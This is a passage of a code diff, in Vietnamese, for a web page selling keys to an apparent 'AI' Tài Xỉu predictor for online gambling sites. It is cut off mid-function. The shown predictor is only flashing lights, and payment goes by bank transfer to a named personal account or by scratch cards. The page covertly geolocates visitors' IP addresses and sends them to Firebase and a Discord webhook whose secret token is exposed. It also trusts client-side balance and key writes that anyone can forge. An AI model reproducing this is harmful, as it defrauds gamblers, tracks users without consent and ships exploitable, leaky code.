@@ -3,107 +3,176 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ADMIN · Hai×bo</title>
+<title>Hai×bo · Tool AI Tài Xỉu</title>
 <style>
-  :root{ --bg:#0a0000; --panel:#1a0000; --red:#ff3333; --gold:#ffd700; --green:#00e676; --cyan:#00e5ff; }
-  *{box-sizing:border-box;font-family:system-ui,sans-serif;margin:0;padding:0}
-  body{ background:radial-gradient(circle at 50% -20%, #330000 0%, var(--bg) 70%); color:#ffe6e6; padding:20px; display:flex; justify-content:center; min-height:100vh; }
-  .app{ width:100%; max-width:1000px; }
-  .header{ text-align:center; margin-bottom:20px; }
-  .header h1{ color:var(--red); text-shadow:0 0 15px var(--red); font-size:2rem; }
-  .card{ background:linear-gradient(180deg,rgba(30,0,0,0.9) 0%, #0a0000 100%); padding:20px; border-radius:12px; border:1px solid #551111; margin-bottom:20px; }
-  h2{ color:var(--red); margin-bottom:15px; font-size:1.1rem; border-bottom:1px solid #551111; padding-bottom:5px; text-transform:uppercase; }
-  input, select{ width:100%; padding:10px; margin-bottom:10px; background:#000; border:1px solid #551111; color:#fff; border-radius:6px; outline:none; }
-  button{ background:var(--red); color:#fff; border:none; padding:10px 15px; border-radius:6px; cursor:pointer; font-weight:bold; transition:0.2s;}
-  button:hover { filter: brightness(1.2); }
-  .btn-g{ background:var(--green); color:#000; } 
-  .btn-c{ background:var(--cyan); color:#000;}
-  .btn-sm { padding: 5px 10px; font-size: 0.8rem; }
-  table{ width:100%; border-collapse:collapse; margin-top:10px; font-size:0.85rem; text-align:left; }
-  th,td{ padding:10px; border-bottom:1px solid #551111; }
-  th{ color:var(--gold); font-size:0.8rem; text-transform:uppercase;}
-  .hidden{ display:none!important; }
-  .status-pending { color: #ffd700; font-weight: bold; }
-  .status-done { color: #00e676; font-weight: bold; }
-  .header-bar { display:flex; justify-content:space-between; align-items:center; background:#0a0000; padding:10px 20px; border-radius:8px; margin-bottom:20px; border:1px solid var(--red); flex-wrap:wrap; gap:10px;}
-  .manual-add-box { background: rgba(0, 230, 118, 0.05); border: 1px dashed var(--green); padding: 15px; border-radius: 8px; margin-bottom: 20px;}
-  .manual-add-box h3 { color: var(--green); margin-bottom: 10px; font-size: 1rem; }
+  /* ... Giữ nguyên CSS cũ của mày ... */
+  body { background: #000; color: #fff; font-family: system-ui, sans-serif; display: flex; justify-content: center; padding: 20px; min-height: 100vh; margin: 0; overflow-x: hidden;}
+  .app { width: 100%; max-width: 500px; position: relative; z-index: 10; }
+  #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
+  #floatingBalance { position: fixed; top: 15px; right: 15px; background: rgba(0, 230, 118, 0.9); color: #000; padding: 8px 15px; border-radius: 20px; font-weight: 900; font-size: 1rem; z-index: 2147483647; box-shadow: 0 0 15px #00e676; border: 2px solid #fff; }
+  .card { background: rgba(10, 15, 10, 0.9); padding: 20px; border-radius: 12px; border: 1px solid #00e676; margin-bottom: 20px; box-shadow: 0 0 15px rgba(0, 230, 118, 0.2); position: relative; backdrop-filter: blur(5px);}
+  h2 { color: #00e676; text-shadow: 0 0 5px #00e676; font-size: 1.1rem; text-transform: uppercase; border-bottom: 1px solid #004d20; padding-bottom: 10px; margin-bottom: 15px; text-align: center;}
+  input, select { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #004d20; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none;}
+  input:focus, select:focus { border-color: #00e676; box-shadow: 0 0 10px rgba(0,230,118,0.3); }
+  button { width: 100%; padding: 14px; border: none; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; margin-bottom: 10px; transition: 0.2s;}
+  .btn-main { background: linear-gradient(90deg, #00e676, #008f4c); color: #000; }
+  .btn-green { background: #00e676; color: #000; }
+  .btn-purple { background: linear-gradient(90deg, #b57bff, #8f5ce0); color: #fff; }
+  .game-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px; }
+  .game-btn { background: rgba(0,0,0,0.6); border: 1px solid #333; padding: 10px; border-radius: 8px; display: flex; flex-direction: column; align-items: center; cursor: pointer; transition: 0.2s; }
+  .game-btn:hover { border-color: #00e676; background: rgba(0,230,118,0.1); }
+  .game-btn img { width: 60px; height: 60px; object-fit: contain; margin-bottom: 5px; border-radius: 8px;}
+  .game-btn span { font-weight: bold; color: #fff; font-size: 0.9rem; }
+  .hidden { display: none !important; }
+  .msg { padding: 10px; border-radius: 6px; font-size: 0.85rem; font-weight: bold; margin-top: 10px; text-align: center; }
+  .msg.err { background: rgba(255,82,82,0.1); color: #ff5252; border: 1px solid #ff5252; }
+  .msg.ok { background: rgba(0,230,118,0.1); color: #00e676; border: 1px solid #00e676; }
+  .msg.info { background: rgba(0,229,255,0.1); color: #00e5ff; border: 1px solid #00e5ff; }
+  .bank-box { background: rgba(0, 230, 118, 0.05); padding: 15px; border: 1px dashed #00e676; border-radius: 8px; margin-bottom: 15px; line-height: 1.6; font-size: 0.9rem; }
+  .card-box { background: rgba(181, 123, 255, 0.05); padding: 15px; border: 1px dashed #b57bff; border-radius: 8px; margin-bottom: 15px; }
+  .autobuy-box { background: rgba(255, 215, 0, 0.05); padding: 15px; border: 1px dashed #ffd700; border-radius: 8px; margin-bottom: 15px; }
+  .bank-code-box { background: rgba(0, 230, 118, 0.1); border: 1px solid #00e676; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center;}
+  .bank-code-box b { font-size: 1.2rem; color: #00e676; letter-spacing: 2px; text-shadow: 0 0 5px #00e676;}
+  .tiktok-icon { position: absolute; top: -15px; right: -15px; padding: 5px 10px; background: #000; border-radius: 20px; border: 1px solid #ff007f; display: flex; align-items: center; gap: 8px; box-shadow: 0 0 10px rgba(255, 0, 127, 0.5); text-decoration: none; color: #fff; font-size: 0.75rem; font-weight: bold; z-index: 10;}
+  .tiktok-icon svg { width: 16px; height: 16px; fill: #fff; }
+  #gameOverlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 99998; background: #000; display: none; flex-direction: column; }
+  #gameFrame { width: 100%; height: 100%; border: none; flex: 1; }
+  #closeGameBtn { position: absolute; top: 10px; left: 10px; background: rgba(255, 0, 0, 0.4); color: white; padding: 4px 8px; border-radius: 4px; z-index: 99999; font-weight: bold; cursor: pointer; border: 1px solid rgba(255,0,0,0.6); font-size: 10px; width: auto; margin: 0; }
+  .float-tool-btn { position: fixed; top: 100px; right: 20px; width: 40px; height: 40px; background: rgba(0, 230, 118, 0.6); border-radius: 50%; border: 1px solid #00e676; box-shadow: 0 0 10px #00e676; z-index: 2147483647; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; backdrop-filter: blur(2px); }
+  .float-tool-box { position: fixed; top: 150px; right: 20px; width: 110px; background: rgba(5,10,5,0.8); border: 1px solid #00e676; border-radius: 8px; padding: 10px; z-index: 2147483647; display: none; text-align: center; backdrop-filter: blur(3px);}
+  .light-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; }
+  .light { width: 20px; height: 20px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.3); }
+  .light.red { background: #300; } .light.green { background: #030; }
+  .light.active-red { animation: flashRed 0.4s 4 alternate; }
+  @keyframes flashRed { 0% { background: #ff0000; box-shadow: 0 0 20px #ff0000; } 100% { background: #500; box-shadow: none; } }
+  .light.active-green { animation: flashGreen 0.4s 4 alternate; }
+  @keyframes flashGreen { 0% { background: #00ff00; box-shadow: 0 0 20px #00ff00; } 100% { background: #050; box-shadow: none; } }
+  .label { font-size: 16px; font-weight: 900; text-shadow: 1px 1px 2px #000, -1px -1px 2px #000, 1px -1px 2px #000, -1px 1px 2px #000; }
+  .label.tai { color: #ff3333; } .label.xiu { color: #00e676; }
+  .ai-text { font-size: 10px; color: #00e676; font-weight: bold; margin-top: 5px; text-shadow: 1px 1px 2px #000; }
+  .key-stock-box { text-align: center; color: #aaa; font-size: 0.85rem; margin-top: 10px; padding: 10px; border: 1px dashed #333; border-radius: 8px;}
+  .key-stock-box b { color: #00e676; font-size: 1.2rem; text-shadow: 0 0 5px #00e676; }
 </style>
 </head>
 <body>
-<div class="app">
-  <div class="header"><h1>ADMIN DASHBOARD</h1></div>
+<canvas id="matrix-canvas"></canvas>
+<div id="floatingBalance">Số dư: 0đ</div>
 
-  <div id="authView" class="card" style="max-width:400px; margin:0 auto;">
-    <h2>Đăng Nhập</h2>
-    <input id="adminPass" type="password" placeholder="Mật khẩu (admin123)...">
-    <button onclick="login()" style="width:100%">VÀO HỆ THỐNG</button>
-    <div id="loginMsg" style="color:var(--red); font-weight:bold; text-align:center; margin-top:10px;"></div>
+<div class="app" id="mainApp">
+  <h1 style="text-align:center; color:#00e676; text-shadow:0 0 10px #00e676; font-family:monospace;">Hai×bo AI STORE</h1>
+
+  <div id="authView" class="card">
+    <a href="https://www.tiktok.com/@nousser64?_r=1&_t=ZS-9AeEvdyWy8G" target="_blank" class="tiktok-icon">
+      <svg viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"></path></svg>
+      (Bấm vào icon mua IB Admin)
+    </a>
+
+    <h2>Nhập Key Để Vào Tool</h2>
+    <input id="keyInput" type="password" placeholder="Nhập Key Đã Mua...">
+    <button class="btn-main" onclick="checkKey()">XÁC NHẬN KEY</button>
+    <div id="authMsg" class="msg err hidden"></div>
+
+    <hr style="border-color: #004d20; margin: 25px 0;">
+
+    <h2>Tự Động Mua Key</h2>
+    <div class="autobuy-box">
+      <select id="buyDuration" style="margin-bottom:10px;">
+        <option value="1|25000">Key 1 Ngày - 25.000đ</option>
+        <option value="7|75000">Key 1 Tuần - 75.000đ</option>
+        <option value="30|200000">Key 1 Tháng - 200.000đ</option>
+        <option value="0|450000">Key Vĩnh Viễn - 450.000đ</option>
+      </select>
+      <button class="btn-main" style="background:linear-gradient(90deg, #ffd700, #ff8c00); color:#000;" onclick="autoBuyKey()">MUA NGAY</button>
+      <div id="buyMsg" class="msg hidden"></div>
+      <div id="boughtKeyDisplay" style="background:#000; padding:10px; border-radius:6px; border:1px dashed #00e676; color:#00e676; font-size:1.1rem; font-weight:bold; text-align:center; margin-top:10px; display:none; user-select:all;"></div>
+    </div>
+
+    <div class="key-stock-box">Kho Key Hiện Tại: <b id="stockCount">Đang tải...</b> Key</div>
+
+    <hr style="border-color: #004d20; margin: 25px 0;">
+
+    <h2>Nạp Tiền Mua Key</h2>
+    <div class="bank-box">
+      <p style="color:#00e676; font-weight:bold; margin-bottom:5px;">1. Chuyển Khoản Ngân Hàng</p>
+      <p>Ngân hàng: <b>LPBank</b></p>
+      <p>Số TK: <b>0868866580</b></p>
+      <p>Chủ TK: <b>MA VAN HUNG</b></p>
+    </div>
+    
+    <div class="bank-code-box">
+      <p>Nội dung CK (Mã thiết bị của bạn):</p>
+      <b id="deviceBankCode">Đang tạo...</b>
+    </div>
+    
+    <input id="bankAmount" type="number" placeholder="Nhập số tiền đã chuyển (Tối thiểu 10k)...">
+    <button class="btn-green" onclick="depositBank()">XÁC NHẬN ĐÃ CHUYỂN KHOẢN</button>
+
+    <br><br>
+    
+    <div class="card-box">
+      <p style="color:#b57bff; font-weight:bold; margin-bottom:5px;">2. Nạp Thẻ Cào</p>
+      <div style="display:flex; gap:10px;">
+        <select id="cardType" style="flex:1;"><option>Viettel</option><option>Vina</option><option>Mobi</option></select>
+        <select id="cardAmount" style="flex:1;"><option value="20000">20.000đ</option><option value="50000">50.000đ</option><option value="100000">100.000đ</option><option value="200000">200.000đ</option><option value="500000">500.000đ</option></select>
+      </div>
+      <input id="cardSerial" placeholder="Số Serial (10-15 số)" maxlength="15">
+      <input id="cardPin" placeholder="Mã thẻ (PIN) (10-15 số)" maxlength="15">
+      <button class="btn-purple" id="btnCard" onclick="depositCard()">GỬI THẺ CÀO</button>
+    </div>
+    <div id="depMsg" class="msg hidden"></div>
   </div>
 
-  <div id="adminPanel" class="hidden">
-    <div class="header-bar">
-      <div style="color:var(--red); font-weight:bold; letter-spacing:1px;">HỆ THỐNG QUẢN LÝ</div>
-      <div style="display:flex; gap:10px; flex-wrap:wrap;">
-        <button class="btn-c btn-sm" onclick="changePassword()">🔑 Đổi Pass</button>
-        <button class="btn-sm" style="background:#ff5252; color:#fff;" onclick="clearDepositHistory()">🗑 Xóa Lịch Sử Nạp</button>
-        <button class="btn-sm" onclick="location.reload()">Đăng Xuất</button>
+  <div id="mainView" class="hidden">
+    <div class="card">
+      <h2>Chọn Game Để Vào</h2>
+      <div class="game-grid">
+        <div class="game-btn" onclick="openGame('sun')"><img src="https://cdnlogo.com/logos/s/63/sunwin.png" onerror="this.src='https://via.placeholder.com/60x60/000/00e676?text=Sunwin'"><span>Sunwin</span></div>
+        <div class="game-btn" onclick="openGame('b52')"><img src="https://i-b52.site/wp-content/uploads/2024/08/logo-b52-club-1.png" onerror="this.src='https://via.placeholder.com/60x60/000/00e676?text=B52'"><span>B52 Club</span></div>
+        <div class="game-btn" onclick="openGame('lc79')"><img src="https://via.placeholder.com/60x60/000/00e676?text=LC79"><span>LC79</span></div>
+        <div class="game-btn" onclick="openGame('iwin')"><img src="https://via.placeholder.com/60x60/000/00e676?text=iWin"><span>iWin Club</span></div>
       </div>
-    </div>
-
-    <!-- QUẢN LÝ THIẾT BỊ TRUY CẬP -->
-    <div class="card">
-      <h2>Quản Lý Thiết Bị Truy Cập</h2>
-      <table>
-        <thead><tr><th>Mã TB</th><th>IP / Tỉnh</th><th>Thiết bị</th><th>Số Dư</th><th>Lần cuối</th><th>Hành động</th></tr></thead>
-        <tbody id="deviceList"><tr><td colspan="6" style="text-align:center; color:#888;">Đang tải dữ liệu...</td></tr></tbody>
-      </table>
-    </div>
-
-    <div class="manual-add-box">
-      <h3>💰 Cộng Tiền Thủ Công</h3>
-      <div style="display:flex; gap:10px; margin-bottom:10px;">
-        <input id="manualDeviceCode" placeholder="Mã TB (VD: HB-123456)" style="flex:2;">
-        <input id="manualAmount" type="number" placeholder="Số tiền" style="flex:1;">
-      </div>
-      <button class="btn-g" onclick="manualAddMoney()" style="width:100%;">CỘNG TIỀN</button>
-      <div id="manualMsg" style="font-weight:bold; text-align:center; margin-top:10px;"></div>
-    </div>
-
-    <div class="card">
-      <h2>Duyệt Nạp Tiền</h2>
-      <table>
-        <thead><tr><th>Mã TB</th><th>Hình thức</th><th>IP / Tỉnh</th><th>Thông tin</th><th>Hành động</th></tr></thead>
-        <tbody id="depList"><tr><td colspan="5" style="text-align:center; color:#888;">Đang tải dữ liệu...</td></tr></tbody>
-      </table>
-    </div>
-
-    <div class="card">
-      <h2>Tạo Key Kích Hoạt</h2>
-      <div style="display:flex; gap:10px; margin-bottom:10px;">
-        <select id="keyDuration" style="flex:1;"><option value="1">1 Ngày</option><option value="7">1 Tuần</option><option value="30">1 Tháng</option><option value="0">Vĩnh Viễn</option></select>
-        <input type="number" id="keyDeviceLimit" value="1" min="1" style="flex:1;" title="Số thiết bị">
-        <button class="btn-c" onclick="createKey()" style="flex:1;">Tạo Key</button>
-      </div>
-      <div id="keyResult" style="background:#000; padding:15px; border:1px dashed var(--gold); color:var(--gold); text-align:center; font-size:1.2rem; font-weight:bold; display:none; letter-spacing:1px;"></div>
-    </div>
-
-    <div class="card">
-      <h2>Danh Sách Key Đã Tạo</h2>
-      <table>
-        <thead><tr><th>Mã Key</th><th>Hạn</th><th>Thiết bị (Dùng / Tối đa)</th><th>Trạng Thái</th><th>Hành động</th></tr></thead>
-        <tbody id="keyList"><tr><td colspan="5" style="text-align:center; color:#888;">Đang tải dữ liệu...</td></tr></tbody>
-      </table>
+      <button style="background:#333; color:#fff; margin-top:10px;" onclick="location.reload()">Đăng Xuất</button>
     </div>
   </div>
 </div>
 
-<!-- FIREBASE SDK -->
+<div id="gameOverlay">
+  <button id="closeGameBtn" onclick="closeGame()">✕ Thoát</button>
+  <iframe id="gameFrame" src="about:blank" allowfullscreen></iframe>
+</div>
+
+<div id="floatBtn" class="float-tool-btn hidden" onclick="toggleTool()">🎮</div>
+<div id="toolBox" class="float-tool-box">
+  <div class="light-row"><div id="lightTai" class="light red"></div><span class="label tai">TÀI</span></div>
+  <div class="light-row"><div id="lightXiu" class="light green"></div><span class="label xiu">XỈU</span></div>
+  <div class="ai-text" id="aiStatus" style="margin-top:10px;">AI: Chờ...</div>
+</div>
+
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 
 <script>
-  window.onerror = function(msg) { alert("Lỗi: " + msg); };
+  // HIỆU ỨNG MA TRẬN
+  const canvas = document.getElementById('matrix-canvas'); const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+  const chars = "IWINLC79B52SUNWIN0123456789@#$%".split(""); const fontSize = 16;
+  const columns = canvas.width / fontSize; const drops = [];
+  for(let x = 0; x < columns; x++) drops[x] = 1;
+  function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#00e676"; ctx.font = fontSize + "px monospace";
+    for(let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 50);
+  window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+
+  window.onerror = function(msg) { alert("Lỗi Script: " + msg); };
+
   const firebaseConfig = {
     apiKey: "AIzaSyAaQg91q7wMeQ4kXyCnOQuolvN_KmJoHBI",
     authDomain: "vip1-c45cb.firebaseapp.com",
@@ -113,150 +182,172 @@
     appId: "1:191209527323:web:b908c85ad00bfb6c2ac0be",
     databaseURL: "https://vip1-c45cb-default-rtdb.asia-southeast1.firebasedatabase.app"
   };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
+  let db = null; try { firebase.initializeApp(firebaseConfig); db = firebase.database(); } catch(e) {}
 
   const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1561068482504691742/R5_eAJ4B5QaQ7iGpCORqd8ZPwTiYDVJuUucjiiYqaMS4NjfN-zQ6cAvupv-IW9lN54Ke";
-  const getPass = () => localStorage.getItem('admin_password') || "admin123";
+  let isToolOpen = false, deviceCode = "", deviceInfo = { ip: "", location: "", device: "" };
+  let userBalance = 0, userRef = null;
+  
+  function updateBalanceUI() { document.getElementById('floatingBalance').innerText = "Số dư: " + userBalance.toLocaleString() + "đ"; }
 
-  function login() {
-    if(document.getElementById('adminPass').value === getPass()) {
-      document.getElementById('authView').classList.add('hidden');
-      document.getElementById('adminPanel').classList.remove('hidden');
-      loadDevices(); // Gọi hàm load thiết bị
-      loadDeposits();
-      loadKeys();
-    } else { document.getElementById('loginMsg').innerText = "Sai mật khẩu!"; }
-  }
-
-  function changePassword() {
-    const oldPass = prompt("Nhập mật khẩu hiện tại:");
-    if(oldPass !== getPass()) return alert("Mật khẩu cũ sai!");
-    const newPass = prompt("Nhập mật khẩu MỚI:");
-    if(newPass && newPass.trim() !== "") { localStorage.setItem('admin_password', newPass.trim()); alert("Đổi mật khẩu thành công!"); }
-  }
-
-  // HÀM LOAD DANH SÁCH THIẾT BỊ TRUY CẬP
-  function loadDevices() {
-    const deviceList = document.getElementById('deviceList');
-    db.ref('users').on('value', snap => {
-      deviceList.innerHTML = "";
-      if(!snap.exists()) { deviceList.innerHTML = "<tr><td colspan='6' style='text-align:center;'>Chưa có thiết bị nào</td></tr>"; return; }
-      
-      const arr = Object.keys(snap.val()).map(k => ({ code: k, ...snap.val()[k] })).sort((a,b)=> (b.lastActive||0) - (a.lastActive||0));
-      
-      arr.forEach(dev => {
-        const lastAct = dev.lastActive ? new Date(dev.lastActive).toLocaleString('vi-VN') : "Chưa rõ";
-        const ipStr = dev.ip || "Không rõ IP";
-        const locStr = dev.location || "Không rõ";
-        const deviceStr = dev.device || "Không rõ";
-        const balanceStr = (dev.balance || 0).toLocaleString() + "đ";
-
-        deviceList.innerHTML += `
-          <tr>
-            <td style="color:var(--gold); font-weight:bold; user-select:all">${dev.code}</td>
-            <td><b>IP:</b> ${ipStr}<br><small style="color:#aaa;">${locStr}</small></td>
-            <td>${deviceStr}</td>
-            <td style="color:var(--green); font-weight:bold;">${balanceStr}</td>
-            <td style="font-size:0.75rem; color:#aaa;">${lastAct}</td>
-            <td><button class="btn-sm" style="background:#551111;" onclick="deleteDevice('${dev.code}')">Xóa</button></td>
-          </tr>
-        `;
-      });
-    });
-  }
-
-  function deleteDevice(code) {
-    if(confirm("Xóa vĩnh viễn thiết bị " + code + " khỏi hệ thống?")) {
-      db.ref('users/' + code).remove();
+  // LẤY THÔNG TIN & CẬP NHẬT LÊN FIREBASE
+  async function getDeviceData() {
+    let savedCode = localStorage.getItem('haibo_device_code');
+    if (!savedCode) {
+      savedCode = "HB-" + Math.floor(100000 + Math.random() * 900000);
+      localStorage.setItem('haibo_device_code', savedCode);
     }
-  }
+    deviceCode = savedCode;
+    document.getElementById('deviceBankCode').innerText = deviceCode;
 
-  function clearDepositHistory() {
-    if(!confirm("Mày có chắc chắn muốn xóa TOÀN BỘ lịch sử nạp tiền không? Hành động này sẽ xóa sạch dữ liệu trên Firebase và không thể hoàn tác!")) return;
-    db.ref('deposits').remove().then(() => { alert("Đã xóa sạch toàn bộ lịch sử nạp tiền!"); }).catch(err => { alert("Lỗi khi xóa: " + err.message); });
-  }
-
-  function manualAddMoney() {
-    const devCode = document.getElementById('manualDeviceCode').value.trim();
-    const amount = parseInt(document.getElementById('manualAmount').value);
-    const msg = document.getElementById('manualMsg');
-    if(!devCode || isNaN(amount) || amount <= 0) { msg.style.color = "#ff5252"; msg.innerText = "Nhập đúng Mã TB và Số Tiền (> 0)"; return; }
-    msg.style.color = "#ffd700"; msg.innerText = "Đang xử lý...";
-
-    db.ref('users/' + devCode + '/balance').transaction((currentBal) => { return (currentBal || 0) + amount; }, (error, committed, snapshot) => {
-      if (error) { msg.style.color = "#ff5252"; msg.innerText = "Lỗi: " + error.message; } 
-      else if (committed) {
-        msg.style.color = "#00e676"; msg.innerText = `Đã cộng ${amount.toLocaleString()}đ cho thiết bị ${devCode}!`;
-        document.getElementById('manualDeviceCode').value = ""; document.getElementById('manualAmount').value = "";
-        fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "Admin Hai×bo", embeds: [{ title: "💸 CỘNG TIỀN THỦ CÔNG", color: 16711680, description: `Admin đã cộng **${amount.toLocaleString()}đ** vào thiết bị **${devCode}**.`, timestamp: new Date().toISOString() }] }) });
-      }
+    userRef = db.ref('users/' + deviceCode);
+    userRef.once('value').then(snap => {
+      if(!snap.exists()) { userRef.set({ balance: 0, createdAt: Date.now() }); }
     });
-  }
+    userRef.child('balance').on('value', snap => { userBalance = snap.val() || 0; updateBalanceUI(); });
 
-  function createKey() {
-    const days = parseInt(document.getElementById('keyDuration').value);
-    const maxDevices = parseInt(document.getElementById('keyDeviceLimit').value) || 1;
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; let key = "HB-";
-    for(let i=0; i<12; i++) { if(i === 4 || i === 8) key += "-"; key += chars.charAt(Math.floor(Math.random() * chars.length)); }
-    let expireTime = days === 0 ? 0 : Date.now() + (days * 24 * 60 * 60 * 1000);
-    db.ref('keys/' + key).set({ duration: days === 0 ? "Vĩnh viễn" : days + " Ngày", expire: expireTime, maxDevices: maxDevices, usedDevices: {}, createdAt: new Date().toLocaleString('vi-VN'), timestamp: Date.now() })
-    .then(() => { let el = document.getElementById('keyResult'); el.style.display = "block"; el.innerText = key; });
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      let dev = "PC";
+      if(/android/i.test(navigator.userAgent)) dev = "Android";
+      else if(/iPhone|iPad/i.test(navigator.userAgent)) dev = "iOS";
+      deviceInfo = { ip: data.ip || "Lỗi IP", location: (data.city || "?") + ", " + (data.region || "?"), device: dev };
+      
+      // CẬP NHẬT THÔNG TIN THIẾT BỊ LÊN FIREBASE
+      userRef.update({
+        ip: deviceInfo.ip,
+        location: deviceInfo.location,
+        device: deviceInfo.device,
+        lastActive: Date.now()
+      });
+    } catch(e) { deviceInfo = { ip: "Lỗi mạng", location: "Lỗi mạng", device: "Không rõ" }; }
   }
+  getDeviceData();
 
-  function loadKeys() {
-    const keyList = document.getElementById('keyList');
+  function listenKeyStock() {
+    if(!db) return;
     db.ref('keys').on('value', snap => {
-      keyList.innerHTML = "";
-      if(!snap.exists()) { keyList.innerHTML = "<tr><td colspan='5' style='text-align:center;'>Chưa có key nào</td></tr>"; return; }
-      const arr = Object.keys(snap.val()).map(k => ({ key: k, ...snap.val()[k] })).sort((a,b)=>b.timestamp - a.timestamp);
-      arr.forEach(item => {
-        const isExpired = item.expire !== 0 && item.expire < Date.now();
-        const statusHtml = isExpired ? `<span style="color:#ff5252">Hết hạn</span>` : `<span style="color:#00e676">Hoạt động</span>`;
-        const usedCount = item.usedDevices ? Object.keys(item.usedDevices).length : 0;
-        const maxDev = item.maxDevices || 1;
-        const deviceStatus = usedCount >= maxDev ? `<span style="color:#ff5252">${usedCount}/${maxDev} (Đầy)</span>` : `<span style="color:#00e5ff">${usedCount}/${maxDev}</span>`;
-        keyList.innerHTML += `<tr><td style="color:var(--gold); font-weight:bold; user-select:all">${item.key}</td><td>${item.duration}</td><td>${deviceStatus}</td><td>${statusHtml}</td><td><button class="btn-sm" style="background:#551111;" onclick="deleteKey('${item.key}')">Xóa</button></td></tr>`;
+      if(snap.exists()) {
+        const keysObj = snap.val(); let activeCount = 0; const now = Date.now();
+        for (let k in keysObj) { if (keysObj[k].expire === 0 || keysObj[k].expire > now) { activeCount++; } }
+        document.getElementById('stockCount').innerText = activeCount;
+      } else { document.getElementById('stockCount').innerText = "0"; }
+    });
+  }
+  listenKeyStock();
+
+  function sendDiscordNotify(action, amount, detail) {
+    if(!DISCORD_WEBHOOK) return;
+    fetch(DISCORD_WEBHOOK, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: "Hai×bo System", embeds: [{ title: `🚨 YÊU CẦU ${action.toUpperCase()}`, color: 65280, fields: [{ name: "Mã TB", value: deviceCode, inline: true }, { name: "Số tiền", value: amount.toLocaleString() + "đ", inline: true }, { name: "IP", value: deviceInfo.ip || "Lỗi", inline: true }, { name: "Khu vực", value: deviceInfo.location || "Lỗi", inline: true }, { name: "Chi tiết", value: detail, inline: false }], timestamp: new Date().toISOString() }] })
+    }).catch(e=>console.log(e));
+  }
+
+  function checkKey() {
+    const input = document.getElementById('keyInput').value.trim();
+    if(!db) return alert("Firebase chưa kết nối!");
+    db.ref('keys/' + input).once('value').then(snap => {
+      if(snap.exists()) {
+        const data = snap.val();
+        if(data.expire > Date.now() || data.expire === 0) {
+          const maxDev = data.maxDevices || 1; const usedDevs = data.usedDevices || {};
+          if (usedDevs[deviceCode]) { grantAccess(); } 
+          else if (Object.keys(usedDevs).length < maxDev) {
+            db.ref('keys/' + input + '/usedDevices/' + deviceCode).set(true).then(() => grantAccess());
+          } else { let m = document.getElementById('authMsg'); m.classList.remove('hidden'); m.innerText = "Key này đã đạt giới hạn thiết bị!"; }
+        } else { let m = document.getElementById('authMsg'); m.classList.remove('hidden'); m.innerText = "Key đã hết hạn!"; }
+      } else { let m = document.getElementById('authMsg'); m.classList.remove('hidden'); m.innerText = "Key không tồn tại!"; }
+    });
+  }
+
+  function grantAccess() {
+    document.getElementById('authView').classList.add('hidden');
+    document.getElementById('mainView').classList.remove('hidden');
+  }
+
+  function autoBuyKey() {
+    if(!db || !userRef) return;
+    const [days, price] = document.getElementById('buyDuration').value.split('|').map(Number);
+    const msg = document.getElementById('buyMsg'); const keyDisplay = document.getElementById('boughtKeyDisplay');
+    if(userBalance < price) { msg.className = 'msg err'; msg.classList.remove('hidden'); msg.innerText = "Số dư không đủ!"; return; }
+
+    userRef.child('balance').set(userBalance - price).then(() => {
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; let newKey = "HB-";
+      for(let i=0; i<12; i++) { if(i === 4 || i === 8) newKey += "-"; newKey += chars.charAt(Math.floor(Math.random() * chars.length)); }
+      let expireTime = days === 0 ? 0 : Date.now() + (days * 24 * 60 * 60 * 1000);
+
+      db.ref('keys/' + newKey).set({ duration: days === 0 ? "Vĩnh viễn" : days + " Ngày", expire: expireTime, maxDevices: 1, usedDevices: {}, createdAt: new Date().toLocaleString('vi-VN'), timestamp: Date.now() })
+      .then(() => {
+        msg.className = 'msg ok'; msg.classList.remove('hidden'); msg.innerText = "Mua thành công!";
+        keyDisplay.style.display = "block"; keyDisplay.innerText = newKey;
+        sendDiscordNotify("Mua Key", price, `Đã xuất key ${newKey}`);
       });
     });
   }
 
-  function deleteKey(key) { if(confirm("Xóa key: " + key + " ?")) db.ref('keys/' + key).remove(); }
+  function depositCard() {
+    if(!db) return;
+    const type = document.getElementById('cardType').value; const amount = parseInt(document.getElementById('cardAmount').value);
